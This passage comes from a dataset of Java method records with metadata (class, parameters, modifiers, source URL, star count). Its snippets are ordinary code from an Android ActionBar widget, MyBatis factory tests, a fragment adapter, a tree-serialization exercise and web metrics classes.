"method_name": "addAction", "class_name": "ActionBar", "params": ["Action", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAction(Action action, int index) {\n        mActionsView.addView(inflateAction(action), index);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58223, "method_name": "removeAllActions", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeAllActions() {\n        mActionsView.removeAllViews();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58224, "method_name": "removeActionAt", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeActionAt(int index) {\n        mActionsView.removeViewAt(index);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58225, "method_name": "removeAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeAction(Action action) {\n        int childCount = mActionsView.getChildCount();\n        for (int i = 0; i < childCount; i++) {\n            View view = mActionsView.getChildAt(i);\n            if (view != null) {\n                final Object tag = view.getTag();\n                if (tag instanceof Action && tag.equals(action)) {\n                    mActionsView.removeView(view);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58226, "method_name": "getActionCount", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getActionCount() {\n        return mActionsView.getChildCount();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58227, "method_name": "inflateAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["private"], "return_type": "View", "snippet": "    private View inflateAction(Action action) {\n        View view = mInflater.inflate(R.layout.actionbar_item, mActionsView, false);\n\n        ImageButton labelView =\n            (ImageButton) view.findViewById(R.id.actionbar_item);\n        labelView.setImageResource(action.getDrawable());\n\n        view.setTag(action);\n        view.setOnClickListener(this);\n        return view;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58228, "method_name": "getDrawable", "class_name": "AbstractAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getDrawable() {\n            return mDrawable;\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": null, "implements": ["Action"], "modifiers": ["abstract", "public", "static"]}}, {"id": 58229, "method_name": "performAction", "class_name": "IntentAction", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void performAction(View view) {\n            try {\n               mContext.startActivity(mIntent); \n            } catch (ActivityNotFoundException e) {\n                Toast.makeText(mContext,\n                        mContext.getText(R.string.actionbar_activity_not_found),\n                        Toast.LENGTH_SHORT).show();\n            }\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "AbstractAction", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58230, "method_name": "createClass", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createClass() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    TestClass testClass = defaultObjectFactory.create(TestClass.class,\n        Arrays.asList(String.class, Integer.class), Arrays.asList(\"foo\", 0));\n\n    Assertions.assertEquals((Integer) 0, testClass.myInteger, \"myInteger didn't match expected\");\n    Assertions.assertEquals(\"foo\", testClass.myString, \"myString didn't match expected\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58231, "method_name": "createClassThrowsProperErrorMsg", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createClassThrowsProperErrorMsg() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    try {\n      defaultObjectFactory.create(TestClass.class, Collections.singletonList(String.class), Collections.singletonList(\"foo\"));\n      Assertions.fail(\"Should have thrown ReflectionException\");\n    } catch (Exception e) {\n      Assertions.assertTrue(e instanceof ReflectionException, \"Should be ReflectionException\");\n      Assertions.assertTrue(e.getMessage().contains(\"(String)\"), \"Should not have trailing commas in types list\");\n      Assertions.assertTrue(e.getMessage().contains(\"(foo)\"), \"Should not have trailing commas in values list\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58232, "method_name": "creatHashMap", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void creatHashMap() {\n     DefaultObjectFactory defaultObjectFactory=new DefaultObjectFactory();\n     Map  map= defaultObjectFactory.create(Map.class,null,null);\n     Assertions.assertTrue(map instanceof HashMap, \"Should be HashMap\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58233, "method_name": "createArrayList", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createArrayList() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    List list = defaultObjectFactory.create(List.class);\n    Assertions.assertTrue(list instanceof ArrayList, \" list should be ArrayList\");\n\n    Collection collection = defaultObjectFactory.create(Collection.class);\n    Assertions.assertTrue(collection instanceof ArrayList, \" collection should be ArrayList\");\n\n    Iterable iterable = defaultObjectFactory.create(Iterable.class);\n    Assertions.assertTrue(iterable instanceof ArrayList, \" iterable should be ArrayList\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58234, "method_name": "createTreeSet", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createTreeSet() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    SortedSet sortedSet = defaultObjectFactory.create(SortedSet.class);\n    Assertions.assertTrue(sortedSet instanceof TreeSet, \" sortedSet should be TreeSet\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58235, "method_name": "createHashSet", "class_name": "DefaultObjectFactoryTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void createHashSet() {\n    DefaultObjectFactory defaultObjectFactory = new DefaultObjectFactory();\n    Set set = defaultObjectFactory.create(Set.class);\n    Assertions.assertTrue(set instanceof HashSet, \" set should be HashSet\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/factory/DefaultObjectFactoryTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58236, "method_name": "getTariffOption", "class_name": "TariffOptionUpdate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TariffOption", "snippet": "    public TariffOption getTariffOption() {\n        return tariffOption;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionUpdate.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58237, "method_name": "setTariffOption", "class_name": "TariffOptionUpdate", "params": ["TariffOption"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTariffOption(TariffOption value) {\n        this.tariffOption = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/tariff/option/TariffOptionUpdate.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58238, "method_name": "getItem", "class_name": "BaseFragmentAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "F", "snippet": "    public F getItem(int position) {\n        return mFragmentSet.get(position);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58239, "method_name": "getCount", "class_name": "BaseFragmentAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return mFragmentSet.size();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58240, "method_name": "setPrimaryItem", "class_name": "BaseFragmentAdapter", "params": ["ViewGroup", "int", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPrimaryItem(@NonNull ViewGroup container, int position, @NonNull Object object) {\n        if (getCurrentFragment() != object) {\n            // \u8bb0\u5f55\u5f53\u524d\u7684Fragment\u5bf9\u8c61\n            mCurrentFragment = (F) object;\n        }\n        super.setPrimaryItem(container, position, object);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58241, "method_name": "addFragment", "class_name": "BaseFragmentAdapter", "params": ["F"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addFragment(F fragment) {\n        mFragmentSet.add(fragment);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58242, "method_name": "getAllFragment", "class_name": "BaseFragmentAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<F>", "snippet": "    public List<F> getAllFragment() {\n        return mFragmentSet;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58243, "method_name": "getCurrentFragment", "class_name": "BaseFragmentAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "F", "snippet": "    public F getCurrentFragment() {\n        return mCurrentFragment;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58244, "method_name": "startUpdate", "class_name": "BaseFragmentAdapter", "params": ["ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startUpdate(@NonNull ViewGroup container) {\n        super.startUpdate(container);\n        if (container instanceof ViewPager) {\n            // \u8bb0\u5f55\u7ed1\u5b9a ViewPager\n            mViewPager = (ViewPager) container;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58245, "method_name": "setCurrentItem", "class_name": "BaseFragmentAdapter", "params": ["Class<F>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentItem(Class<? extends F> clazz) {\n        for (int i = 0; i < mFragmentSet.size(); i++) {\n            if (mFragmentSet.get(i).getClass() == clazz) {\n                setCurrentItem(i);\n                break;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58246, "method_name": "setCurrentItem", "class_name": "BaseFragmentAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentItem(int position) {\n        if (mViewPager != null) {\n            mViewPager.setCurrentItem(position);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58247, "method_name": "setCurrentItem", "class_name": "BaseFragmentAdapter", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentItem(int position, boolean smoothScroll) {\n        if (mViewPager != null) {\n            mViewPager.setCurrentItem(position, smoothScroll);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseFragmentAdapter.java", "stars": "1", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 58248, "method_name": "validate", "class_name": "UsersUniqueEmailValidator", "params": ["UserUniqueEmailValidatableCommand"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void validate(UserUniqueEmailValidatableCommand command) {\n        boolean hasSameEmail = usersReadService.hasUserWithEmail(command.getEmailAddress());\n        Validate.isTrue(!hasSameEmail, \"Email address already exists\");\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/command-validation-support/src/main/java/engineering/everest/lhotse/axon/command/validators/UsersUniqueEmailValidator.java", "stars": "9", "class_props": {"extends": null, "implements": ["Validates"], "modifiers": ["public"]}}, {"id": 58249, "method_name": "main", "class_name": "Demo03Stream_filter", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u4e00\u4e2aStream\u6d41\n        Stream<String> stream = Stream.of(\"\u5f20\u4e09\u4e30\", \"\u5f20\u7fe0\u5c71\", \"\u8d75\u654f\", \"\u5468\u82b7\u82e5\", \"\u5f20\u65e0\u5fcc\");\n        //\u5bf9Stream\u6d41\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u8fc7\u6ee4,\u53ea\u8981\u59d3\u5f20\u7684\u4eba\n        Stream<String> stream2 = stream.filter((String name)->{return name.startsWith(\"\u5f20\");});\n        //\u904d\u5386stream2\u6d41\n        stream2.forEach(name-> System.out.println(name));\n\n        /*\n            Stream\u6d41\u5c5e\u4e8e\u7ba1\u9053\u6d41,\u53ea\u80fd\u88ab\u6d88\u8d39(\u4f7f\u7528)\u4e00\u6b21\n            \u7b2c\u4e00\u4e2aStream\u6d41\u8c03\u7528\u5b8c\u6bd5\u65b9\u6cd5,\u6570\u636e\u5c31\u4f1a\u6d41\u8f6c\u5230\u4e0b\u4e00\u4e2aStream\u4e0a\n            \u800c\u8fd9\u65f6\u7b2c\u4e00\u4e2aStream\u6d41\u5df2\u7ecf\u4f7f\u7528\u5b8c\u6bd5,\u5c31\u4f1a\u5173\u95ed\u4e86\n            \u6240\u4ee5\u7b2c\u4e00\u4e2aStream\u6d41\u5c31\u4e0d\u80fd\u518d\u8c03\u7528\u65b9\u6cd5\u4e86\n            IllegalStateException: stream has already been operated upon or closed\n         */\n        //\u904d\u5386stream\u6d41\n        stream.forEach(name-> System.out.println(name));\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo02/Stream/Demo03Stream_filter.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58250, "method_name": "preSerial", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Queue<String>", "snippet": "\tpublic static Queue<String> preSerial(Node head) {\n\t\tQueue<String> ans = new LinkedList<>();\n\t\tpres(head, ans);\n\t\treturn ans;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58251, "method_name": "pres", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Node", "Queue<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void pres(Node head, Queue<String> ans) {\n\t\tif (head == null) {\n\t\t\tans.add(null);\n\t\t} else {\n\t\t\tans.add(String.valueOf(head.value));\n\t\t\tpres(head.left, ans);\n\t\t\tpres(head.right, ans);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58252, "method_name": "buildByPreQueue", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Queue<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node buildByPreQueue(Queue<String> prelist) {\n\t\tif (prelist == null || prelist.size() == 0) {\n\t\t\treturn null;\n\t\t}\n\t\treturn preb(prelist);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58253, "method_name": "preb", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Queue<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node preb(Queue<String> prelist) {\n\t\tString value = prelist.poll();\n\t\tif (value == null) {\n\t\t\treturn null;\n\t\t}\n\t\tNode head = new Node(Integer.valueOf(value));\n\t\thead.left = preb(prelist);\n\t\thead.right = preb(prelist);\n\t\treturn head;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58254, "method_name": "levelSerial", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Queue<String>", "snippet": "\tpublic static Queue<String> levelSerial(Node head) {\n\t\tQueue<String> ans = new LinkedList<>();\n\t\tif (head == null) {\n\t\t\tans.add(null);\n\t\t} else {\n\t\t\tans.add(String.valueOf(head.value));\n\t\t\tQueue<Node> queue = new LinkedList<Node>();\n\t\t\tqueue.add(head);\n\t\t\twhile (!queue.isEmpty()) {\n\t\t\t\thead = queue.poll();\n\t\t\t\tif (head.left != null) {\n\t\t\t\t\tans.add(String.valueOf(head.left.value));\n\t\t\t\t\tqueue.add(head.left);\n\t\t\t\t} else {\n\t\t\t\t\tans.add(null);\n\t\t\t\t}\n\t\t\t\tif (head.right != null) {\n\t\t\t\t\tans.add(String.valueOf(head.right.value));\n\t\t\t\t\tqueue.add(head.right);\n\t\t\t\t} else {\n\t\t\t\t\tans.add(null);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn ans;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58255, "method_name": "buildByLevelQueue", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Queue<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node buildByLevelQueue(Queue<String> levelList) {\n\t\tif (levelList == null || levelList.size() == 0) {\n\t\t\treturn null;\n\t\t}\n\t\tNode head = generateNode(levelList.poll());\n\t\tQueue<Node> queue = new LinkedList<Node>();\n\t\tif (head != null) {\n\t\t\tqueue.add(head);\n\t\t}\n\t\tNode node = null;\n\t\twhile (!queue.isEmpty()) {\n\t\t\tnode = queue.poll();\n\t\t\tnode.left = generateNode(levelList.poll());\n\t\t\tnode.right = generateNode(levelList.poll());\n\t\t\tif (node.left != null) {\n\t\t\t\tqueue.add(node.left);\n\t\t\t}\n\t\t\tif (node.right != null) {\n\t\t\t\tqueue.add(node.right);\n\t\t\t}\n\t\t}\n\t\treturn head;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58256, "method_name": "generateNode", "class_name": "Code04_SerializeAndReconstructTree", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node generateNode(String val) {\n\t\tif (val == null) {\n\t\t\treturn null;\n\t\t}\n\t\treturn new Node(Integer.valueOf(val));\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58257, "method_name": "generateRandomBST", "class_name": "Code04_SerializeAndReconstructTree", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node generateRandomBST(int maxLevel, int maxValue) {\n\t\treturn generate(1, maxLevel, maxValue);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58258, "method_name": "generate", "class_name": "Code04_SerializeAndReconstructTree", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node generate(int level, int maxLevel, int maxValue) {\n\t\tif (level > maxLevel || Math.random() < 0.5) {\n\t\t\treturn null;\n\t\t}\n\t\tNode head = new Node((int) (Math.random() * maxValue));\n\t\thead.left = generate(level + 1, maxLevel, maxValue);\n\t\thead.right = generate(level + 1, maxLevel, maxValue);\n\t\treturn head;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58259, "method_name": "isSameValueStructure", "class_name": "Code04_SerializeAndReconstructTree", "params": ["Node", "Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isSameValueStructure(Node head1, Node head2) {\n\t\tif (head1 == null && head2 != null) {\n\t\t\treturn false;\n\t\t}\n\t\tif (head1 != null && head2 == null) {\n\t\t\treturn false;\n\t\t}\n\t\tif (head1 == null && head2 == null) {\n\t\t\treturn true;\n\t\t}\n\t\tif (head1.value != head2.value) {\n\t\t\treturn false;\n\t\t}\n\t\treturn isSameValueStructure(head1.left, head2.left) && isSameValueStructure(head1.right, head2.right);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58260, "method_name": "main", "class_name": "Code04_SerializeAndReconstructTree", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint maxLevel = 5;\n\t\tint maxValue = 100;\n\t\tint testTimes = 1000000;\n\t\tfor (int i = 0; i < testTimes; i++) {\n\t\t\tNode head = generateRandomBST(maxLevel, maxValue);\n\t\t\tQueue<String> pre = preSerial(head);\n\t\t\tQueue<String> level = levelSerial(head);\n\t\t\tNode preBuild = buildByPreQueue(pre);\n\t\t\tNode levelBuild = buildByLevelQueue(level);\n\t\t\tif (!isSameValueStructure(preBuild, levelBuild)) {\n\t\t\t\tSystem.out.println(\"Oops!\");\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"finish!\");\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class07/Code04_SerializeAndReconstructTree.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58261, "method_name": "getFirst", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getFirst() {\n\t\treturn first;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58262, "method_name": "getSecond", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getSecond() {\n\t\treturn second;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58263, "method_name": "getThird", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getThird() {\n\t\treturn third;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58264, "method_name": "indent", "class_name": "StmTernary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void indent() {\n\t\tif (this.first != null) {\n\t\t\tfirst.setIndent(getIndent());\n\t\t\tfirst.indent();\n\t\t}\n\t\tif (second != null) {\n\t\t\tsecond.setIndent(getIndent());\n\t\t\tsecond.indent();\n\t\t}\n\t\tif (third != null) {\n\t\t\tthird.setIndent(getIndent());\n\t\t\tthird.indent();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmTernary.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58265, "method_name": "markWebGetCall", "class_name": "WebMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markWebGetCall() {\n    this.webGetCall.mark();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebMetrics.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58266, "method_name": "markWebPostCall", "class_name": "WebMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markWebPostCall() {\n    this.webPostCall.mark();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebMetrics.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58267, "method_name": "setFetchLogLatency", "class_name": "WebMetrics", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFetchLogLatency(final long milliseconds) {\n    this.logFetchLatency.set(milliseconds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebMetrics.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58268, "method_name": "main", "class_name": "reflectAnnotation", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws Exception{\n        { // \u83b7\u53d6\u63a5\u53e3\u4e0a\u7684Annotation\u4fe1\u606f\n            Annotation annotations[] = myMessage.class.getAnnotations();\n            for(Annotation temp:annotations){\n                